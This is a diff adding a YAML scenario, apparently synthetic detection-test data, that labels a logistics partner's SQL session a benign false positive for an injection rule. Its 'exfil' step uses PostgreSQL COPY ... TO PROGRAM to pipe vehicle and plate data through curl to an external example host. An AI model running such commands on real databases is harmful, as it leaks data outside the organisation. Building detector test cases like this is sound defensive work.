@@ -1,0 +1,32 @@
+scenario_id: gen_logistics_15_sql_injection_ben_357b
+family_id: gen_logistics_15_sql_injection_fam_357
+domain: logistics
+time_of_day: '15:40'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT vehicle_id, plate_number FROM vehicles WHERE shipment_id = 61562
+  - step_id: exfil
+    sql: COPY (SELECT vehicle_id, plate_number FROM vehicles WHERE depot_id = 'DP-02')
+      TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.232
+      port: 8080
+matched_pair_id: gen_logistics_15_sql_injection_pair_357
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
